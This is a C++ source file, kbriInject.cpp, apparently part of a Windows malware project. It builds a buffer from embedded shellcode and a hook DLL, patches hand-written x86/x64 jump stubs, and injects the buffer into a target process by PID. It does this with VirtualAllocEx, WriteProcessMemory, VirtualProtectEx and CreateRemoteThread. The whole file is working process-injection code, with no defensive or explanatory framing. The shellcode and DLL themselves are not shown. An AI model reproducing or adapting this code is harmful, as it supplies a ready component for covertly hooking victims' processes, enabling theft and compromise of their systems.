/*
	kbriInject.cpp
	Inject-related routines
*/

#include <windows.h>

#include "..\inc\dbg.h"
#include "..\inc\mem.h"
#include "..\inc\HashedStrings.h"
#include "..\inc\MyStringRoutines.h"

#include "..\inc\EmbeddedResources.h"
#include "..\Shellcode\shellcode.h"


#include "kbriInject.h"

#if defined(_M_X64)
	#define TARGET_ARCH ARCH_TYPE_X64
#elif defined(_M_IX86)
	#define TARGET_ARCH ARCH_TYPE_X32
#endif


/*
	Prepares injection exec buffer:
	<push ABS_PTR_VAL><call $shellcode_entry_near><shellcode><shellcode_context><kbri_hook dll>
	Caller should invoke kbriPatchInjBufferOffsets() after memory chunk in target process allocated, in order to
	process correct values for shellcode params
*/
BOOL kbriPrepareInjBuffer(LPVOID *pResBuffer, DWORD *dwResBufferLen, DWORD *dwShellcodeEntryOffset, DWORD *dwShellcodeLen)
{
	BOOL bRes = FALSE;

	BYTE *pbPtr;	// ptr to allocated res buffer

	SHELLCODE_CONTEXT sc = { 0 };
	JumpCode jc = { 0 };

	LPVOID pShellcode = NULL;
	DWORD dwShellcode = 0;

	LPVOID pHD = NULL;
	DWORD dwHD = 0;

	do {	// not a loop

		if (!pResBuffer || !dwResBufferLen) { DbgPrint("ERR: invalid input params"); break; }

		// query essential elements
		if (!erQueryFile(RES_TYPE_SHELLCODE, TARGET_ARCH, &pShellcode, &dwShellcode, &sc.dwShellcodeEntrypointOffset, TRUE)) { DbgPrint("ERR: failed to get shellcode"); break; }
		if (!erQueryFile(RES_TYPE_KBRI_HD, TARGET_ARCH, &pHD, &dwHD, NULL, TRUE)) { DbgPrint("ERR: failed to get hd"); break; }

		// save shellcode params for caller to build correct buffer
		*dwShellcodeEntryOffset = sc.dwShellcodeEntrypointOffset;
		*dwShellcodeLen = dwShellcode;

		// now we can calc needed buffer size
		*dwResBufferLen = sizeof(JumpCode) + dwShellcode + sizeof(SHELLCODE_CONTEXT) + dwHD;
		if (!(*pResBuffer = my_alloc(*dwResBufferLen))) { DbgPrint("ERR: failed to alloc %u res buffer", *dwResBufferLen); break; }

		// initial fill structures, params and ptr should be filled by kbriPatchInjBufferOffsets() when remote ptrs are defined
#if defined(_M_X64)
		/*
		x64
		48b9 xxxxxxxxxxxxxxxxx mov rcx, PARAM
		48b8 xxxxxxxxxxxxxxxxx MOV RAX, EXEC_PTR
		ffe0 JMP RAX
		*/
		jc.wMovRaxOpcode = 0xb848;
		jc.wMovRcxOpcode = 0xb948;
		jc.wJmpRaxOpcode = 0xe0ff;
		//jc.ulParam = (SIZE_T)pLocalMem;
		//jc.ulExecAddr = (SIZE_T)pLocalMem + ic->lShellcodeEntryOffset;

#else
		/*
		x32
		push param1	// shellcode's entry param, ptr to SHELLCODE_CONTEXT, currently start of the buffer itself
		push param2	// target ret addr
		ret
		*/
		jc.bPushOpcode1 = 0x68;
		jc.bPushOpcode2 = 0x68;
		jc.bPushOpcode3 = 0x68;
		jc.bRetOpcode = 0xc3;
		//jc.dwPushArg1 = (DWORD)pLocalMem;
		//jc.dwPushArg2 = (DWORD)pLocalMem + (DWORD)ic->lShellcodeEntryOffset;
#endif

		// sc should have prelExecDll (relative ptr for dll to be executed, starting from shellcode_context structure itself), dll len & return flag
		sc.prelExecDll = sizeof(SHELLCODE_CONTEXT);
		sc.dwExecDllLen = dwHD;
		sc.bNoReturnFromShellcode = TRUE;	// maybe FALSE will do ok too, to be checked

		// combine all elements into resulting buffer
		// sizeof(JumpCode) + dwShellcode + sizeof(SHELLCODE_CONTEXT) + dwHD
		pbPtr = (BYTE *)*pResBuffer;
		memcpy(pbPtr, &jc, sizeof(JumpCode));			pbPtr += sizeof(JumpCode);
		memcpy(pbPtr, pShellcode, dwShellcode);			pbPtr += dwShellcode;
		memcpy(pbPtr, &sc, sizeof(SHELLCODE_CONTEXT));	pbPtr += sizeof(SHELLCODE_CONTEXT);
		memcpy(pbPtr, pHD, dwHD);

		bRes = TRUE;

		DbgPrint("initial prepare done, len %u bytes", *dwResBufferLen);

	} while (FALSE);	// not a loop

	if (pShellcode) { my_free(pShellcode); }
	if (pHD) { my_free(pHD); }

	return bRes;
}


/*
	Patches values at JumpCode structure of buffer's start, to point to correct pTargetMemPtr addresses
*/
BOOL kbriPatchInjBufferOffsets(LPVOID pBuffer, LPVOID pTargetMemPtr, DWORD dwShellcodeEntryOffset, DWORD dwShellcodeLen)
{
	BOOL bRes = FALSE;	// func result

	JumpCode *jc = (JumpCode *)pBuffer;

	do {

		if (!pBuffer || !pTargetMemPtr) { DbgPrint("ERR: invalid input params"); break; }

#if defined(_M_X64)
		jc->ulParam = (SIZE_T)pTargetMemPtr + sizeof(JumpCode) + dwShellcodeLen;
		jc->ulExecAddr = (SIZE_T)pTargetMemPtr + dwShellcodeEntryOffset + sizeof(JumpCode);
#else
		jc->dwParam = (DWORD)pTargetMemPtr + sizeof(JumpCode) + dwShellcodeLen;
		jc->dwExecAddr = (DWORD)pTargetMemPtr + dwShellcodeEntryOffset + sizeof(JumpCode);
#endif

		bRes = TRUE;

	} while (FALSE);


	return bRes;
}


/*
	Returns TRUE if injection was ok OR we have a record about this process already, so assume it is already injected
	Target process is identified by dwTargetPID
*/
BOOL kbriAttemptInject(DWORD dwTargetPID)
{
	BOOL bRes = FALSE;
	HANDLE hProcess = NULL;	// opened target process

	LPVOID pInjData = NULL;	// buffer with injection data
	DWORD lInjLen = 0;		// len of data at ^
	DWORD dwShellcodeEntryOffset = 0;	// offset from shellcode's start to it's EP
	DWORD dwShellcodeLen = 0;

	LPVOID pRemoteMem = NULL;	// ptr to memory allocated at target remote process

	SIZE_T lWritten = 0;	// WriteProcessMemory()'s result
	DWORD dwOldProt;

	DWORD dwThreadId = 0;
	HANDLE hRemoteThread = NULL;

	do {	// not a loop

		if (!(hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwTargetPID))) { DbgPrint("ERR: OpenProcess() failed, le %u", GetLastError()); break; }

		// prepare special buffer to be executed at target process
		if (!kbriPrepareInjBuffer(&pInjData, &lInjLen, &dwShellcodeEntryOffset, &dwShellcodeLen)) { DbgPrint("ERR: failed to prepare inj buffer"); break; }

		// alloc mem in target process
		if (!(pRemoteMem = VirtualAllocEx(hProcess, NULL, lInjLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) { DbgPrint("ERR: failed to alloc mem in target process, le %u", GetLastError()); break; }
		DbgPrint("allocated mem in target process at %p", pRemoteMem);

		// patch first instruction in injection buffer to point to correct ptr
		if (!kbriPatchInjBufferOffsets(pInjData, pRemoteMem, dwShellcodeEntryOffset, dwShellcodeLen)) { DbgPrint("ERR: ptrs patch failed"); break; }

		// write data to remote process
		if (!WriteProcessMemory(hProcess, pRemoteMem, pInjData, lInjLen, &lWritten)) { DbgPrint("ERR: failed to write remote mem, le %u", GetLastError()); break; }

		// set correct exec permissions on mem region
		if (!VirtualProtectEx(hProcess, pRemoteMem, lInjLen, PAGE_EXECUTE_READ, &dwOldProt)) { DbgPrint("ERR: failed to set remote mem exec prot, le %u", GetLastError()); break; }

		// essential according to msdn
		if (!FlushInstructionCache(hProcess, pRemoteMem, lInjLen)) { DbgPrint("WARN: failed to flush instr cache"); }

		// start execution
		if (!(hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteMem, pRemoteMem, 0, &dwThreadId))) { DbgPrint("ERR: failed to create remote thread, le %u", GetLastError()); break; }

		DbgPrint("OK: created remote thread tid %u at process pid %u", dwThreadId, dwTargetPID);

		bRes = TRUE;

	} while (FALSE);	// not a loop

	// cleanup
	if (hProcess) { CloseHandle(hProcess); }
	if (pInjData) { my_free(pInjData); }
	if (hRemoteThread) { CloseHandle(hRemoteThread); }

	return bRes;
}